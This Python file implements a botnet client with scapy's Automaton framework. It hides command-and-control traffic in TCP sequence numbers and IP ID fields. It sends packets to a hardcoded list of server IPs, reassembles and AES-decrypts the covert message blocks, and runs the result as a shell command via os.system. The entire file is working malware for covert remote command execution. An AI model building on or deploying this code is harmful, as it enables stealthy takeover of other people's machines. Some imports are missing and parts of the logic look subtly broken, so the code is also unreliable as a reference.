from scapy.all import *
from random import randint


# A hash that returns a 32 bit digest
def hash32(integer):
	sha1 = hashlib.sha1(format(integer, 'x'))
	return int(sha1.hexdigest(), 16) & 0xffffffff

# Converts an int to a string using ASCII encoding
def intToString(integer):
	return format(integer, 'x').decode('hex')

# Decrypts cyphertext as an int
def decryptInt(integer, key):
	key = hashlib.md5(format(key, 'x')).hexdigest().decode('hex') # so that key size is 128bit
	encobj = AES.new(key, AES.MODE_ECB)
	plaintext = encobj.decrypt(intToString(integer))
	return int(plaintext.encode('hex'), 16)


# Our protocol. Implemented using scapy's Automata "framework". Statechart provided in docs.
class Bot(Automaton):

	# our list of static server IPs
	serverList = ['109.238.50.40', '50.63.202.5', '104.20.83.123', '54.192.201.126', '52.74.17.139', '147.161.47.137']

	def parse_args(self, port, **kargs):
		Automaton.parse_args(self, **kargs)
		self.port = port        # the port the bot will be listening at
		self.token = 0          # the working token at any given point
		self.message = 0        # the message being recieved from the CNC server (int)
		self.receiving = False  # whether we are in the proccess of receiving
		self.blockNum = 0       # will be used to keep track of blocks received (out of a 128bit segment)

	# A predefined callback. Called every time a packet is sniffed. Filters out irrelevant packets.
	def master_filter(self, pkt):
		return (IP in pkt and pkt[IP].src in Bot.serverList and TCP in pkt
				and pkt[TCP].dport == self.port)

	# Sends a packet to all servers
	def send(self, tcpSeq, ipId = None):
		pkt = IP()/TCP(sport = self.port)
		pkt[TCP].seq = tcpSeq
		if ipId:
			pkt[IP].id = ipId
		else:
			pkt[IP].id = randint(0, 65535)
		for ip in Bot.serverList:
			pkt[IP].dst = ip
			send(pkt)

	@ATMT.state(initial=1)
	def HELLO(self):
		print 'Sending HELLO packet'
		self.token = randint(0, 4294967295) # upper bound being the max possible integer for 32 bits
		seq = self.token
		self.token = hash32(self.token)
		ipid = self.token & 0xffff # 16 LSBs
		self.send(seq, ipid)
		raise self.PING()

	@ATMT.state()
	def PING(self):
		print 'Sending PING'
		self.send((randint(0, 65535) << 16) | (self.token & 0xffff))
		self.token = hash32(self.token)
		print 'New working token:\t', self.token

	@ATMT.receive_condition(PING)
	def check_for_message(self, pkt):
		# check if 16 MSBs of TCP seq equal the 16 MSBs of working token
		if (pkt[TCP].seq >> 16) == (self.token >> 16):
			self.receiving = True
			print 'Message block received from ', pkt[IP].src
			raise self.PING().action_parameters(pkt[TCP].seq & 0xffff)
		else:
			print 'Empty response received from ' + pkt[IP].src

	@ATMT.timeout(PING, 20)
	def timeout_waiting(self):
		if self.receiving:
			self.message = intToString(self.message).rstrip('\0')
			print 'Completed message:\t', self.message
			self.receiving = False
			raise self.EXECUTE()
		else:
			print 'Timeout waited'
		raise self.PING()

	@ATMT.action(check_for_message)
	def append_message(self, block):
		print 'Received block ', block
		self.message = (self.message << 16) | block
		self.blockNum += 1
		if self.blockNum == 8: # decryption due (16 * 8 = 128)
			print 'Full encrypted segment received ', self.message & (2**128 - 1)
			print 'Decrypting with key ', self.token
			self.message = (((self.message >> 128) << 128) |
						decryptInt(self.message & (2**128 - 1), self.token))
			self.blockNum = 0

	@ATMT.state()
	def EXECUTE(self):
		try:
			print 'Executing...'
			os.system(self.message)
		except OSError:
			print 'Could not execute message as command'
		self.message = 0 # resetting message for next time around
		raise self.PING()

Bot(5555).run()
